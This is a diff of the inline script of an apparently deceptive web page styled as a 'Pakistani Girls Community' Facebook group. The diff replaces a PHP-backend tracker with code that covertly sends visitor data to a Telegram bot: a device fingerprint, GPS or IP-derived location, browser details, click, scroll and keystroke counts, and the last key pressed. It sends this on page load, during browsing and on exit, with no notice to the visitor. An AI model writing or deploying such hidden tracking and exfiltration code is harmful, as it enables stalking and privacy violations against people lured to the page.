-                });
-
-                // Track focus changes
-                document.addEventListener('visibilitychange', () => {
-                    this.behavior.focusChanges.push({
-                        state: document.visibilityState,
-                        timestamp: Date.now()
-                    });
-                });
-
-                console.log('✅ AdvancedTracker started.');
-            }
-
-            startPeriodicLogging() {
-                setInterval(() => {
-                    this.logData();
-                }, 30000);
-            }
-
-            sendInitialData() {
-                const data = {
-                    type: 'initial',
-                    timestamp: new Date().toISOString(),
-                    data: this.data,
-                    behavior: {
-                        mouseMovements: this.behavior.mouseMovements.length,
-                        clicks: this.behavior.clicks.length,
-                        scrolls: this.behavior.scrolls.length,
-                        keystrokes: this.behavior.keystrokes.length,
-                        focusChanges: this.behavior.focusChanges.length
-                    },
-                    url: window.location.href,
-                    referrer: document.referrer || 'direct'
-                };
-                sendDataToServer(data);
-            }
-
-            logData() {
-                const data = {
-                    type: 'periodic',
-                    timestamp: new Date().toISOString(),
-                    sessionDuration: Math.floor((Date.now() - this.behavior.sessionStart) / 1000),
-                    data: this.data,
-                    behavior: {
-                        mouseMovements: this.behavior.mouseMovements.length,
-                        clicks: this.behavior.clicks.length,
-                        scrolls: this.behavior.scrolls.length,
-                        keystrokes: this.behavior.keystrokes.length,
-                        focusChanges: this.behavior.focusChanges.length
-                    }
-                };
-                console.log('📊 Tracking Data:', data);
-                sendDataToServer(data);
-
-                // Store in localStorage for persistence
-                let history = JSON.parse(localStorage.getItem('trackingHistory') || '[]');
-                history.push(data);
-                if (history.length > 50) history.shift();
-                localStorage.setItem('trackingHistory', JSON.stringify(history));
-
-                // Update admin stats
-                updateAdminStats();
-            }
-
-            getSummary() {
-                return {
-                    totalEvents: {
-                        mouse: this.behavior.mouseMovements.length,
-                        clicks: this.behavior.clicks.length,
-                        scrolls: this.behavior.scrolls.length,
-                        keys: this.behavior.keystrokes.length
-                    },
-                    sessionDuration: Math.floor((Date.now() - this.behavior.sessionStart) / 1000),
-                    lastClick: this.behavior.clicks.length > 0 ? this.behavior.clicks[this.behavior.clicks.length - 1] : null
-                };
-            }
-        }
-
-        // ===== 4. SEND DATA TO SERVER (FIXED) =====
-        function sendDataToServer(data) {
-            // Add unique fingerprint
-            const fingerprint = getFingerprint();
-            data.uniqueFingerprint = fingerprint;
-            data.source = 'facebook_group';
-            data.gpsLocation = getGPSLocation();
-
-            // Send to PHP backend
-            fetch('save_data.php', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(result => {
-                console.log('✅ Data sent to server:', result);
-            })
-            .catch(error => {
-                console.log('⚠️ Server not available, saving locally:', error);
-                // Save locally if server fails
-                let localData = JSON.parse(localStorage.getItem('offlineData') || '[]');
-                localData.push(data);
-                if (localData.length > 100) localData.shift();
-                localStorage.setItem('offlineData', JSON.stringify(localData));
-            });
-        }
-
-        // ===== 5. GET UNIQUE FINGERPRINT =====
+        // ===== FINGERPRINT =====
         function getFingerprint() {
             let fp = localStorage.getItem('userFingerprint');
             if (!fp) {
@@ -853,111 +298,145 @@
             return fp;
         }
 
-        // ===== 6. GET GPS LOCATION =====
+        // ===== GPS LOCATION =====
         function getGPSLocation() {
             let location = { lat: null, lng: null, accuracy: null, source: 'unknown' };
-            
-            // Try to get from localStorage first
-            const savedLocation = localStorage.getItem('userLocation');
-            if (savedLocation) {
+            const saved = localStorage.getItem('userLocation');
+            if (saved) {
                 try {
-                    const parsed = JSON.parse(savedLocation);
-                    if (parsed.lat && parsed.lng) {
-                        return parsed;
-                    }
+                    const parsed = JSON.parse(saved);
+                    if (parsed.lat && parsed.lng) return parsed;
                 } catch(e) {}
             }
-
-            // Try HTML5 Geolocation (with user permission)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        location = {
-                            lat: pos.coords.latitude,
-                            lng: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy,
-                            source: 'gps'
-                        };
-                        localStorage.setItem('userLocation', JSON.stringify(location));
+                        const loc = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy, source: 'gps' };
+                        localStorage.setItem('userLocation', JSON.stringify(loc));
+                        return loc;
                     },
                     () => {
-                        // Fallback: IP-based location (approximate)
                         fetch('https://ipapi.co/json/')
                             .then(res => res.json())
                             .then(data => {
                                 if (data.latitude && data.longitude) {
-                                    location = {
-                                        lat: data.latitude,
-                                        lng: data.longitude,
-                                        accuracy: 5000,
-                                        source: 'ip'
-                                    };
-                                    localStorage.setItem('userLocation', JSON.stringify(location));
+                                    const loc = { lat: data.latitude, lng: data.longitude, accuracy: 5000, source: 'ip' };
+                                    localStorage.setItem('userLocation', JSON.stringify(loc));
                                 }
-                            })
-                            .catch(() => {});
+                            }).catch(() => {});
                     },
                     { timeout: 5000 }
                 );
             }
-            return location;
+            return JSON.parse(localStorage.getItem('userLocation') || '{"lat":null,"lng":null}');
         }
 
-        // ===== 7. TRACK USER ACTIONS =====
-        function trackUserAction(action, detail) {
-            console.log(`🎯 User Action: ${action} - ${detail}`);
-            const data = {
-                action: action,
-                detail: detail,
+        // ===== TRACKING VARIABLES =====
+        let clickCount = 0, scrollCount = 0, keyCount = 0, sessionStart = Date.now();
+        const fingerprint = getFingerprint();
+        const gpsLocation = getGPSLocation();
+
+        // ===== TRACK CLICKS =====
+        document.addEventListener('click', (e) => {
+            clickCount++;
+            if (clickCount % 5 === 0) {
+                sendDataToTelegram({
+                    type: 'click',
+                    action: 'click_batch',
+                    timestamp: new Date().toISOString(),
+                    fingerprint: fingerprint,
+                    gpsLocation: gpsLocation,
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    url: window.location.href,
+                    behavior: { clicks: clickCount, scrolls: scrollCount, keystrokes: keyCount },
+                    detail: `Element: ${e.target.tagName}`
+                });
+            }
+        });
+
+        // ===== TRACK SCROLLS =====
+        document.addEventListener('scroll', () => {
+            scrollCount++;
+            if (scrollCount % 10 === 0) {
+                sendDataToTelegram({
+                    type: 'scroll',
+                    action: 'scroll_update',
+                    timestamp: new Date().toISOString(),
+                    fingerprint: fingerprint,
+                    gpsLocation: gpsLocation,
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    url: window.location.href,
+                    behavior: { clicks: clickCount, scrolls: scrollCount, keystrokes: keyCount },
+                    detail: `Position: ${window.scrollY}px`
+                });
+            }
+        });
+
+        // ===== TRACK KEYSTROKES =====
+        document.addEventListener('keydown', (e) => {
+            keyCount++;
+            if (keyCount % 15 === 0) {
+                sendDataToTelegram({
+                    type: 'keystroke',
+                    action: 'key_batch',
+                    timestamp: new Date().toISOString(),
+                    fingerprint: fingerprint,
+                    gpsLocation: gpsLocation,
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    url: window.location.href,
+                    behavior: { clicks: clickCount, scrolls: scrollCount, keystrokes: keyCount },
+                    detail: `Last key: ${e.key}`
+                });
+            }
+        });
+
+        // ===== SEND INITIAL DATA =====
+        setTimeout(() => {
+            sendDataToTelegram({
+                type: 'page_view',
+                action: 'page_loaded',
                 timestamp: new Date().toISOString(),
-                fingerprint: getFingerprint()
-            };
-            sendDataToServer(data);
-            let actions = JSON.parse(localStorage.getItem('userActions') || '[]');
-            actions.push(data);
-            if (actions.length > 100) actions.shift();
-            localStorage.setItem('userActions', JSON.stringify(actions));
-        }
+                fingerprint: fingerprint,
+                gpsLocation: gpsLocation,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                url: window.location.href,
+                referrer: document.referrer || 'direct',
+                behavior: { clicks: 0, scrolls: 0, keystrokes: 0, sessionDuration: 0 }
+            });
+        }, 2000);
 
-        // ===== 8. INITIALIZE TRACKER =====
-        let tracker;
-
-        function initTracker() {
-            tracker = new AdvancedTracker();
-            trackUserAction('page_view', 'group_page_loaded');
-            console.log('🚀 Tracker initialized successfully!');
-        }
-
-        // Run when page loads
-        document.addEventListener('DOMContentLoaded', initTracker);
-
-        // ===== 9. CLOSE MODAL ON CLICK OUTSIDE =====
-        document.getElementById('joinModal').addEventListener('click', function(e) {
-            if (e.target === this) {
-                hideJoinModal();
-            }
-        });
-
-        // ===== 10. KEYBOARD SHORTCUT - ESC to close modal =====
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Escape') {
-                hideJoinModal();
-            }
-        });
-
-        // ===== 11. SEND DATA ON PAGE UNLOAD =====
-        window.addEventListener('beforeunload', function() {
-            const data = {
+        // ===== SEND ON UNLOAD =====
+        window.addEventListener('beforeunload', () => {
+            sendDataToTelegram({
                 type: 'session_end',
+                action: 'page_unload',
                 timestamp: new Date().toISOString(),
-                sessionDuration: tracker ? tracker.getSummary().sessionDuration : 0,
-                fingerprint: getFingerprint()
-            };
-            sendDataToServer(data);
+                fingerprint: fingerprint,
+                gpsLocation: gpsLocation,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                url: window.location.href,
+                behavior: {
+                    clicks: clickCount,
+                    scrolls: scrollCount,
+                    keystrokes: keyCount,
+                    sessionDuration: Math.floor((Date.now() - sessionStart) / 1000)
+                }
+            });
         });
 
-        console.log('✅ All systems ready!');
-        console.log('👩 Pakistani Girls Community loaded successfully!');
+        console.log('🚀 Telegram Bot Data Sending Active!');
+        console.log('📱 Chat ID:', TELEGRAM_CHAT_ID);
+        console.log('🆔 Fingerprint:', fingerprint);
+        console.log('📍 Location:', gpsLocation);
     </script>
 
 </body>
